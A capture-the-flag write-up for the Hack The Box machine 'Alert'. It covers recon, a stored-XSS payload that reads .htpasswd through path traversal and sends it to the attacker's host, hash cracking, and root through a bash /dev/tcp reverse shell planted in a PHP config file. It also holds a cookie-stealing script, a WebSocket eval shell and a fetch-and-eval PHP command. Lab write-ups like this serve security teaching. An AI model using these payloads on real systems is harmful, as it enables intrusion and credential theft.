![image](https://github.com/user-attachments/assets/030ff9e0-bef1-4519-ac5c-1b697f91c49f)![image](https://github.com/user-attachments/assets/4a261af5-e03e-4ac9-a1b7-a716623f9918)# Alert
OS: Linux\
Difficulty: Easy

## Steps
### Recon
I first check UDP because that messed me up in the past:
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-0xppy3gxfc][~]
 []$ nmap -T5 -sV -p- -sU --open --min-rate=1500 -Pn alert.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 20:23 CST
Warning: 10.10.11.44 giving up on port because retransmission cap hit (2).
Nmap scan report for alert.htb (10.10.11.44)
Host is up (0.0090s latency).
Skipping host alert.htb (10.10.11.44) due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 904.17 seconds
```
Nothing.\
A regular scan next:
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-0xppy3gxfc][~]
 []$ nmap -T5 -sV -p- --open --min-rate=1500 -Pn alert.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 20:40 CST
Nmap scan report for alert.htb (10.10.11.44)
Host is up (0.0093s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
```
Fantastic, we have a web page up:\
![image](https://github.com/user-attachments/assets/a8e12dcb-df03-4178-98c6-3726b54e16cd)\
It appears to be some kind of markdown viewer site where we can upload files.

Inside the *About Us* section:\
Hello! We are Alert.\
Our service gives you the ability to view MarkDown.\
We are reliable, secure, fast and easy to use.\
If you experience any problems with our service, please let us know.\
Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours.\
Thank you for using our service!

#### Enumeration
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ gobuster dir -u http://alert.htb -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://alert.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/css                  (Status: 301) [Size: 304] [--> http://alert.htb/css/]
/index.php            (Status: 302) [Size: 660] [--> index.php?page=alert]
/messages             (Status: 301) [Size: 309] [--> http://alert.htb/messages/]
/server-status        (Status: 403) [Size: 274]
/uploads              (Status: 301) [Size: 308] [--> http://alert.htb/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

#### Vuln Hunting
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ nuclei -u http://alert.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.9.14

		projectdiscovery.io

[WRN] Found 1113 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v2.9.14 (outdated)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 8428
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1715 (Reduced 1606 Requests)
[INF] Using Interactsh Server: oast.site
[caa-fingerprint] [dns] [info] alert.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:clear-site-data] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:x-content-type-options] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:referrer-policy] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:strict-transport-security] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:content-security-policy] [http] [info] http://alert.htb/index.php?page=alert
[http-missing-security-headers:permissions-policy] [http] [info] http://alert.htb/index.php?page=alert
[waf-detect:apachegeneric] [http] [info] http://alert.htb/
[INF] Skipped alert.htb:80 from target list as found unresponsive 30 times
```

---
### Attempted Exploitation
I have seem file uploads before and pwned them with specific methods.\
Let us see what this one looks like when we attempt a normal upload:
```Markdown
# Test Markdown
Hello, World!
```
![image](https://github.com/user-attachments/assets/f9a1dcfe-ec51-4e10-b7b1-5fd34c06df84)\
Now to test with Burp:
```HTTP
POST /visualizer.php HTTP/1.1
Host: alert.htb
Content-Length: 214
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://alert.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABkYSkt0LAb385T1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://alert.htb/index.php?page=alert
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryABkYSkt0LAb385T1
Content-Disposition: form-data; name="file"; filename="test.md"
Content-Type: text/markdown

# Test Markdown
Hello, World!

------WebKitFormBoundaryABkYSkt0LAb385T1--
```
Response:
```HTTP
HTTP/1.1 200 OK
Date: Mon, 06 Jan 2025 02:56:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 781
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alert - Markdown Viewer</title>
    <link rel="stylesheet" href="css/style.css">
    <style>
        .share-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: rgb(100, 100, 100);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Test Markdown</h1>
<p>Hello, World!</p><a class="share-button" href="http://alert.htb/visualizer.php?link_share=677b46468fa204.71362595.md" target="_blank">Share Markdown</a></body>
</html>
```

> NOTE: I am not able to upload non *.md* files
>> This means I may need to try hiding the file such as *payload.php.md*

Attempting a venom shell:
```Bash
msfvenom -p php/reverse_php LHOST=10.10.14.3 LPORT=4444 -f raw > shell.php
```
```Bash
mv shell.php shell.php.md
```
> Changing the extension like this **did** allow for an upload!
>> unfortunately, the shell **did not** work...back to trying another way.

---
#### XSS
I went back and ran Nuclei to see what potential vulnerabilities I could find.\
What resulted was the lack of security headers, meaning we can do some *cross-site-scripting*!
```HTML
<script>alert('XSS')</script>
```
![image](https://github.com/user-attachments/assets/6550ec60-d83e-4dfa-8da5-2da78b1d8631)
> It worked!
>> Time to try more.

```HTML
<script>
    fetch('http://10.10.14.3:8080/?cookie=' + document.cookie);
</script>
```
```Bash
nc -lvnp 8080
```
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ cat toast.md 
<script>alert('XSS')</script>
```
> Result:
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.14.3] 45500
GET /?cookie= HTTP/1.1
Host: 10.10.14.3:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://alert.htb/
Origin: http://alert.htb
DNT: 1
Connection: keep-alive
Sec-GPC: 1
```

Trying with Web-Socket now:
```HTML
<script>
    const ws = new WebSocket('ws://10.10.14.3:1117');
    ws.onopen = function() {
        ws.send("Connection established");
    };
    ws.onmessage = function(event) {
        eval(event.data);
    };
</script>

```
```
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ nc -lvnp 1117
listening on [any] 1117 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.14.3] 41534
GET / HTTP/1.1
Host: 10.10.14.3:1117
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: http://alert.htb
Sec-WebSocket-Extensions: permessage-deflate
Sec-WebSocket-Key: hPgHZlyP6apnbxsZ3l1usA==
DNT: 1
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```
The web socket worked but did not return a shell.\
I will need to set up a WebSocket server to receive:
```Bash
pipx install websockets
```
```Python
import asyncio
import websockets

async def handler(websocket, path):
    print("[+] Connection established")
    while True:
        try:
            command = input("Shell> ")
            if command.lower() == "exit":
                await websocket.close()
                break
            await websocket.send(command)
            response = await websocket.recv()
            print(response)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

start_server = websockets.serve(handler, "0.0.0.0", 1117)
print("[+] WebSocket server listening on port 1117")

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
```
and then use this:
```HTML
<script>
    const ws = new WebSocket('ws://10.10.14.3:1117');
    ws.onopen = function() {
        ws.send("Connected to WebSocket reverse shell");
    };
    ws.onmessage = function(event) {
        const result = eval(event.data); // Execute received commands
        ws.send(result.toString());     // Send the result back
    };
</script>
```
Huzzah!
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ python3 websocket_server.py 
[+] WebSocket server listening on port 1117
[+] Connection established
Shell> 
```

> It sort of froze up and broke...
```Bash
[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
 []$ python3 websocket_server.py 
[+] WebSocket server listening on port 1117
[+] Connection established
Shell> whoami
Connected to WebSocket reverse shell
Shell> id

^CTraceback (most recent call last):
  File "/home/gntsqid/websocket_server.py", line 23, in <module>
    asyncio.get_event_loop().run_forever()
  File "/usr/lib/python3.11/asyncio/base_events.py", line 607, in run_forever
    self._run_once()
  File "/usr/lib/python3.11/asyncio/base_events.py", line 1884, in _run_once
    event_list = self._selector.select(timeout)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/selectors.py", line 468, in select
    fd_event_list = self._selector.poll(timeout, max_ev)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyboardInterrupt
```
Going to try metasploit instead.

#### MetaSploit
```Bash
[msf](Jobs:0 Agents:0) >> search type:exploit web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery
```
```Bash
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> show targets

Exploit targets:
=================

    Id  Name
    --  ----
    0   Python
    1   PHP
=>  2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X
```
```Bash
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set target 2
target => 2
```
but an exploit needs a *compatible* payload\
in this case we need a powershell one
```Bash
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> show payloads

Compatible Payloads
===================

   #    Name                                                        Disclosure Date  Rank    Check  Description
   -    ----                                                        ---------------  ----    -----  -----------
   0    payload/generic/custom                                                       normal  No     Custom Payload
   1    payload/generic/debug_trap                                                   normal  No     Generic x86 Debug Trap
   2    payload/generic/shell_bind_aws_ssm                                           normal  No     Command Shell, Bind SSM (via AWS API)
   3    payload/generic/shell_bind_tcp                                               normal  No     Generic Command Shell, Bind TCP Inline
   4    payload/generic/shell_reverse_tcp                                            normal  No     Generic Command Shell, Reverse TCP Inline
   5    payload/generic/ssh/interact                                                 normal  No     Interact with Established SSH Connection
   6    payload/generic/tight_loop                                                   normal  No     Generic x86 Tight Loop

<snipped>
```
```Bash
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> 
[*] Started reverse TCP handler on 10.10.14.3:1117 
[*] Using URL: http://10.10.14.3:8080/xyz
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.10.14.3:8080/xyz', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```
```HTML
# Trigger Reverse Shell

<script>
    fetch('http://alert.htb/visualizer.php?link_share=php://input', {
        method: 'POST',
        body: "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://10.10.14.3:8080/xyz', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));\";"
    });
</script>
```

> ACTUAL WORKING PAYLOAD:
```HTML
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
.then(response => response.text())
.then(data => {
fetch("http://10.10.14.28:1337/?file_content=" + encodeURIComponent(data));
});
</script>
```
Upload, then share link, and finally paste link in Contact Us page!\
![image](https://github.com/user-attachments/assets/74d2cd05-7d03-4bbd-974b-76acdc83841e)


### Post-Exploit
~~We officially have a working shell.~~
```Bash
[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
 []$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.14.28 - - [13/Jan/2025 13:46:14] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.14.28 - - [13/Jan/2025 13:46:16] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [13/Jan/2025 13:46:27] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 
```
URL Decoded in cyberchef:
```Bash
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

#### User Hash
```Bash
[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
 []$ hashcat --identify hash
No hash-mode matches the structure of the input hash.
```
After removing the username (*thanks Juan!*):
```Bash
[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
 []$ hashcat --identify hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
```
```Bash
hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt
```
```Bash
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
```
> *albert:manchesterunited*

#### User
```Bash
albert@alert:~$ cat user.txt 
ca977a0288a07be6118cdf7b3cc641f8
```
User Hash Found!
> *ca977a0288a07be6118cdf7b3cc641f8*

### Internal Recon
```bash
albert@alert:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        8      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```
```Bash
albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```
> Interesting, we are in a group called *mangement*

we see something running locally on port 8080, so let us do a reverse shell to access it:
```Bash
ssh -L 1337:127.0.0.1:8080 albert@alert.htb
```
```Bash
albert@alert:~$ ls /var/www
alert.htb  html  statistics.alert.htb
```
![image](https://github.com/user-attachments/assets/afa2393d-186f-4c90-a8f6-190d712617de)\
![image](https://github.com/user-attachments/assets/ae567df5-14da-41df-a28b-80585c677085)

```Bash
albert@alert:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
```
```Bash
albert@alert:~$ cat !$configuration.php
cat /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>
```
```Bash
albert@alert:~$ stat !$
stat /opt/website-monitor/config/configuration.php
  File: /opt/website-monitor/config/configuration.php
  Size: 49        	Blocks: 8          IO Block: 4096   regular file
Device: fd00h/64768d	Inode: 3785        Links: 1
Access: (0775/-rwxrwxr-x)  Uid: (    0/    root)   Gid: ( 1001/management)
Access: 2025-01-14 00:08:54.617302315 +0000
Modify: 2025-01-14 00:08:54.617302315 +0000
Change: 2025-01-14 00:08:54.621302315 +0000
 Birth: -
```


### Root
```Bash
[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
 []$ ssh -L 1337:127.0.0.1:8080 albert@alert.htb
```
```Bash
albert@alert:~$ cat /opt/website-monitor/config/configuration.php 
<?php
define('PATH', '/opt/website-monitor');
exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.28/1339 0>&1'");
?>
```
![image](https://github.com/user-attachments/assets/864cddd8-23f1-466d-95bc-a616a90d337b)

```bash
[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
 []$ nc -lvnp 1339
listening on [any] 1339 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.44] 46932
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
88cfdae679ef6a85e6abad34e6e2e43d
```
> **88cfdae679ef6a85e6abad34e6e2e43d**








